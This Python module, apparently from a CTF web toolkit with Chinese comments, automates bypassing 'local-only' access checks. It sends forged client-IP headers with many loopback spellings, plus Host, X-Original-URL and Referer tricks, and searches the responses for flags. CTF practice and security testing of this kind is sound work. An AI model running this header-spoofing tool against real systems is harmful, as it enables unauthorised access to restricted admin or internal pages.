# -*- coding: utf-8 -*-
"""
本地访问绕过（伪造 IP）
=====================
CTF Web 高频套路：页面提示「只有本地才能访问 / 仅限 127.0.0.1」。
后端用 `$_SERVER['REMOTE_ADDR']` 判断还好，但很多题用的是
`X-Forwarded-For` / `X-Real-IP` 这类**可以伪造**的头。

这里做的事：
  1. 先发一次正常请求，记下基线（状态码 / 长度 / 内容）
  2. 逐个伪造 IP 头再请求，看响应有没有变化
  3. 同时试 GET 和 POST
  4. 任何一次响应里出现 flag 就立刻返回

只用于你有权测试的目标。
"""
import re
import urllib.parse

# 常见的「客户端 IP」头（不同框架认的不一样，全试一遍）
# 会用来判断「客户端 IP」的请求头。
# 不同语言/框架认的不一样，所以全试一遍：
#   PHP 常看 X-Forwarded-For / Client-IP
#   Java (Spring) 常看 X-Forwarded-For / X-Real-IP
#   Node (Express) 看 X-Forwarded-For
#   IIS/ASP.NET 看 X-Forwarded-For / X-Original-For
#   部分老框架看 X-Real-IP / X-Remote-Addr / Remote-Addr
IP_HEADERS = [
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Client-IP",
    "Client-IP",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "Remote-Addr",
    "True-Client-IP",
    "CF-Connecting-IP",
    "X-ProxyUser-Ip",
    "X-Cluster-Client-IP",
    "X-Original-For",
    "Forwarded",
    "Via",
]

# 优先级最高的几个头（每个都会配多个 IP 值去试）
TOP_HEADERS = [
    "X-Forwarded-For",
    "X-Real-IP",
    "Client-IP",
    "X-Client-IP",
    "X-Originating-IP",
    "X-Remote-IP",
]

# 本地地址的各种写法（有些题会做字符串比较，写法不同结果不同）
LOCAL_IPS = [
    "127.0.0.1",
    "localhost",
    "127.0.0.1:80",
    "::1",
    "0.0.0.0",
    "127.1",
    "2130706433",       # 127.0.0.1 的十进制
    "0177.0.0.1",       # 八进制
    "127.0.0.1, 127.0.0.1",
]

# 高频头优先配这几个值（覆盖 99% 的写法）
CORE_IPS = ["127.0.0.1", "localhost", "::1", "2130706433"]

# X-Forwarded-For 的「链式」写法：
# 后端取第几个 IP 决定成败 —— 有的取第一个，有的取最后一个
XFF_CHAINS = [
    "127.0.0.1, 1.1.1.1",
    "1.1.1.1, 127.0.0.1",
    "127.0.0.1,127.0.0.1",
    "8.8.8.8, 127.0.0.1, 10.0.0.1",
]

# 其它常见的「本地访问」绕过向量（不只是 IP 头）
EXTRA_VECTORS = [
    ("Host", "127.0.0.1", "改 Host 头骗过后端白名单"),
    ("X-Forwarded-Host", "127.0.0.1", "X-Forwarded-Host 伪造"),
    ("X-Original-URL", "/admin", "X-Original-URL 绕过路由限制"),
    ("X-Rewrite-URL", "/admin", "X-Rewrite-URL 绕过路由限制"),
    ("Referer", "http://127.0.0.1/", "Referer 伪造来源"),
    ("Origin", "http://127.0.0.1", "Origin 伪造来源"),
]

# 「本地访问」的典型提示语 —— 命中说明这题就是考这个
LOCAL_HINTS = [
    "only local", "local only", "仅限本地", "只允许本地", "只有本地",
    "127.0.0.1", "localhost", "内网", "本机", "from local",
    "not allowed", "forbidden", "access denied", "无权访问", "禁止访问",
    "admin only", "仅管理员",
]


def _hdr_value(name, ip):
    """Forwarded 头的格式和别的不一样"""
    if name == "Forwarded":
        return "for=%s;proto=http;by=%s" % (ip, ip)
    if name in ("X-Forwarded-Host", "X-Host"):
        return ip
    return ip


def _has_local_hint(text):
    low = (text or "").lower()
    return any(h in low for h in LOCAL_HINTS)


def _sig(resp):
    """响应的「指纹」，用来判断内容变没变"""
    body = resp.get("body") or b""
    return (resp.get("status"), len(body), body[:200])


def spoof_local(url, http, take, say, add_flag, timeout=6,
                post_data=None, find_flags=None, max_tries=45):
    """
    伪造本地 IP 访问。

    http(url, method=..., headers=..., data=...) -> {"status","body","len",...}
    take() -> bool（请求预算）
    say(text, tag) -> 输出一行
    add_flag(flag, where) -> 记一个 flag
    find_flags(bytes) -> (hits, cands)

    返回 {"flags": [...], "hit_header": "...", "baseline": ...}
    """
    rep = {"flags": [], "hit_header": "", "baseline": None, "changed": []}
    if not take():
        return rep

    # 1) 基线
    base = http(url, timeout=timeout)
    if base.get("error") or not base.get("status"):
        say("  连不上，跳过本地访问绕过", "dim")
        return rep
    rep["baseline"] = (base["status"], base.get("len") or 0)
    base_sig = _sig(base)
    base_text = (base.get("body") or b"").decode("utf-8", "ignore")[:4000]
    say(f"  基线：HTTP {base['status']}，{base.get('len') or 0} 字节", "dim")

    # 基线里就有 flag 的话直接收
    if find_flags:
        h, _c = find_flags(base.get("body") or b"")
        for x in h:
            s = x.decode("utf-8", "ignore")
            if s not in rep["flags"]:
                rep["flags"].append(s)
                add_flag(s, "本地访问（基线）")

    # 题目是不是在考「仅本地」？
    if _has_local_hint(base_text):
        say("  ★ 页面提示「仅本地/127.0.0.1」—— 这题就是考 IP 伪造，重点试", "warn")

    # 2) 逐个头 + 逐个写法
    tried = 0
    # ---- 组合顺序（按命中概率从高到低，命中 flag 立刻返回）
    combos = []
    # ① 最常见的头 × 核心几种写法
    for ip in CORE_IPS:
        combos.append(("X-Forwarded-For", ip))
    # ② XFF 的链式写法（后端取第一个还是最后一个，结果不同）
    for ch in XFF_CHAINS:
        combos.append(("X-Forwarded-For", ch))
    # ③ 其它高频头 × 127.0.0.1
    for name in TOP_HEADERS:
        if name != "X-Forwarded-For":
            combos.append((name, "127.0.0.1"))
    # ④ 其余冷门头 × 127.0.0.1
    for name in IP_HEADERS:
        if name not in TOP_HEADERS:
            combos.append((name, "127.0.0.1"))
    # ⑤ 高频头再补一个 localhost（有些题只认这个字符串）
    for name in TOP_HEADERS[:4]:
        combos.append((name, "localhost"))

    # 控制总量：默认最多 45 个，别把扫描预算吃光
    combos = combos[:max_tries]

    for name, ip in combos:
        if not take():
            break
        tried += 1
        hdrs = {name: _hdr_value(name, ip)}
        r = http(url, headers=hdrs, timeout=timeout)
        if r.get("error") or not r.get("status"):
            continue
        if find_flags:
            h, _c = find_flags(r.get("body") or b"")
            for x in h:
                txt = x.decode("utf-8", "ignore")
                if txt not in rep["flags"]:
                    rep["flags"].append(txt)
                    rep["hit_header"] = f"{name}: {ip}"
                    add_flag(txt, f"本地访问 {name}: {ip}")
                    say(f"  ★★ {name}: {ip} → 拿到 flag", "ok")
        # 内容变了就记一下（说明后端认了这个头）
        if _sig(r) != base_sig:
            rep["changed"].append((name, ip, r["status"], r.get("len") or 0))
        if rep["flags"]:
            return rep

    # 2.5) 其它绕过向量（Host / X-Original-URL / Referer …）
    for name, val, why in EXTRA_VECTORS:
        if not take():
            break
        tried += 1
        r = http(url, headers={name: val}, timeout=timeout)
        if r.get("error") or not r.get("status"):
            continue
        if find_flags:
            h, _c = find_flags(r.get("body") or b"")
            for x in h:
                txt = x.decode("utf-8", "ignore")
                if txt not in rep["flags"]:
                    rep["flags"].append(txt)
                    rep["hit_header"] = f"{name}: {val}"
                    add_flag(txt, f"{why}（{name}: {val}）")
                    say(f"  ★★ {name}: {val}（{why}）→ 拿到 flag", "ok")
        if _sig(r) != base_sig:
            rep["changed"].append((name, val, r["status"], r.get("len") or 0))
        if rep["flags"]:
            return rep

    # 3) 所有头一起上（有些框架只看其中一个，全给最保险）
    if take():
        hdrs = {n: _hdr_value(n, "127.0.0.1") for n in IP_HEADERS}
        hdrs["Referer"] = "http://127.0.0.1/"
        hdrs["X-Forwarded-For"] = "127.0.0.1, 127.0.0.1"
        r = http(url, headers=hdrs, timeout=timeout)
        if not r.get("error") and r.get("status"):
            if find_flags:
                h, _c = find_flags(r.get("body") or b"")
                for x in h:
                    s = x.decode("utf-8", "ignore")
                    if s not in rep["flags"]:
                        rep["flags"].append(s)
                        rep["hit_header"] = "全部头一起"
                        add_flag(s, "本地访问（全部头）")
                        say("  ★★ 全部伪造头一起发 → 拿到 flag", "ok")
            if _sig(r) != base_sig:
                rep["changed"].append(("全部头", "127.0.0.1", r["status"], r.get("len") or 0))
        if rep["flags"]:
            return rep

    # 4) POST（有些题只在 POST 上判断）
    data = post_data if post_data is not None else {}
    for name in ("X-Forwarded-For", "X-Real-IP", "Client-IP"):
        if not take():
            break
        hdrs = {name: "127.0.0.1"}
        r = http(url, method="POST", headers=hdrs, data=data, timeout=timeout)
        if r.get("error") or not r.get("status"):
            continue
        if find_flags:
            h, _c = find_flags(r.get("body") or b"")
            for x in h:
                s = x.decode("utf-8", "ignore")
                if s not in rep["flags"]:
                    rep["flags"].append(s)
                    rep["hit_header"] = f"POST {name}: 127.0.0.1"
                    add_flag(s, f"本地访问 POST {name}")
                    say(f"  ★★ POST + {name}: 127.0.0.1 → 拿到 flag", "ok")
        # 注意：POST 到只支持 GET 的地址天然会 404，不能拿 GET 的基线比，
        # 只有「POST 成功（2xx）且内容和 GET 基线不同」才算有意义的变化
        if 200 <= (r.get("status") or 0) < 300 and _sig(r) != base_sig:
            rep["changed"].append(("POST " + name, "127.0.0.1",
                                   r["status"], r.get("len") or 0))
    if rep["flags"]:
        return rep

    # 5) 汇报
    say(f"  伪造 IP：试了 {tried} 种头+写法，没直接拿到 flag", "dim")
    if rep["changed"]:
        name, ip, st, ln = rep["changed"][0]
        say(f"  但响应有变化：{name}: {ip} → HTTP {st}，{ln} 字节"
            f"（说明后端认这个头，手动跟进）", "warn")
    else:
        say("  所有伪造头的响应都和基线一样 —— 后端可能用 REMOTE_ADDR 判断，"
            "伪造不了（要打 SSRF 或改 XFF 链路）", "dim")
    return rep


# ---------------------------------------------------------------- 独立请求
def _request(url, method="GET", headers=None, data=None, timeout=8):
    """不依赖 webscan 的最小 HTTP 请求（urllib），返回 dict"""
    import urllib.request
    import urllib.error
    import ssl

    out = {"status": 0, "body": b"", "len": 0, "headers": {}, "error": ""}
    hdrs = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 Chrome/120 Safari/537.36",
        "Accept": "*/*",
        "Connection": "close",
    }
    hdrs.update(headers or {})
    body = None
    if data is not None:
        if isinstance(data, dict):
            body = urllib.parse.urlencode(data).encode()
            hdrs.setdefault("Content-Type", "application/x-www-form-urlencoded")
        else:
            body = data
    req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # 本地/内网地址不走系统代理：很多人开着 Clash/V2Ray，
    # 代理会把 127.0.0.1 的请求也转走 —— 慢好几秒，还可能直接 502
    host = urllib.parse.urlsplit(url).hostname or ""
    local = False
    if host in ("localhost", "127.0.0.1", "::1", "0.0.0.0"):
        local = True
    else:
        try:
            import ipaddress
            local = ipaddress.ip_address(host).is_private
        except Exception:
            local = "localhost" in host
    if local:
        opener = urllib.request.build_opener(
            urllib.request.ProxyHandler({}),
            urllib.request.HTTPSHandler(context=ctx))
        _open = opener.open
    else:
        _open = lambda rq, timeout=timeout: urllib.request.urlopen(
            rq, timeout=timeout, context=ctx)
    try:
        with _open(req, timeout=timeout) as r:
            out["status"] = r.status
            out["body"] = r.read(2 * 1024 * 1024)
            out["len"] = len(out["body"])
            out["headers"] = dict(r.headers)
    except urllib.error.HTTPError as e:
        out["status"] = e.code
        try:
            out["body"] = e.read(2 * 1024 * 1024)
            out["len"] = len(out["body"])
        except Exception:
            pass
        out["headers"] = dict(e.headers or {})
    except Exception as e:
        out["error"] = str(e)[:120]
    return out


def probe_url(url, timeout=8, find_flags=None):
    """
    给一个 URL，真发几种请求并报告：
      · 普通 GET
      · GET + 伪造本地 IP（X-Forwarded-For: 127.0.0.1）
      · POST + 伪造本地 IP
    任何一次响应里有 flag 就返回。
    """
    L = []
    if not re.match(r"^https?://", url, re.I):
        return L

    def show(tag, r):
        if r["error"]:
            L.append(f"  {tag:26} 失败：{r['error']}")
            return []
        L.append(f"  {tag:26} HTTP {r['status']:<4} {r['len']:>8} 字节")
        got = []
        if find_flags:
            h, _c = find_flags(r["body"])
            for x in h:
                s = x.decode("utf-8", "ignore")
                if s not in got:
                    got.append(s)
        return got

    all_flags = []

    L.append("  ① 普通 GET")
    r0 = _request(url, timeout=timeout)
    all_flags += show("GET", r0)
    # 第一次就连不上（连接被拒 / 域名解析失败）→ 后面两个不用试了，
    # 否则每个都要等超时，用户要干等十几秒
    if r0["error"] and r0["status"] == 0:
        L.append("  连不上目标，跳过后续请求（确认地址和端口对不对）")
        return L

    L.append("  ② 伪造本地 IP（GET）")
    r1 = _request(url, headers={"X-Forwarded-For": "127.0.0.1",
                                "X-Real-IP": "127.0.0.1",
                                "Client-IP": "127.0.0.1",
                                "Referer": "http://127.0.0.1/"}, timeout=timeout)
    all_flags += show("GET + XFF 127.0.0.1", r1)

    L.append("  ③ 伪造本地 IP（POST）")
    r2 = _request(url, method="POST",
                  headers={"X-Forwarded-For": "127.0.0.1",
                           "X-Real-IP": "127.0.0.1"},
                  data={}, timeout=timeout)
    all_flags += show("POST + XFF 127.0.0.1", r2)

    # 内容有没有因为伪造 IP 而变
    if r0["status"] and r1["status"] and (r0["status"], r0["len"]) != (r1["status"], r1["len"]):
        L.append("  ★ 加了 X-Forwarded-For 后响应变了 —— 后端认这个头，"
                 "很可能就是「仅本地访问」的题")
    elif r0["status"] and _has_local_hint((r0["body"] or b"").decode("utf-8", "ignore")[:3000]):
        L.append("  ★ 页面提示「仅本地/127.0.0.1」，但伪造头没生效 —— "
                 "试试 SSRF 或改 XFF 链路")

    # 去重
    seen, uf = set(), []
    for f in all_flags:
        if f not in seen:
            seen.add(f)
            uf.append(f)
    if uf:
        L.append("")
        for f in uf:
            L.append(f"  ★ 回显里有 flag：{f}")
    return L
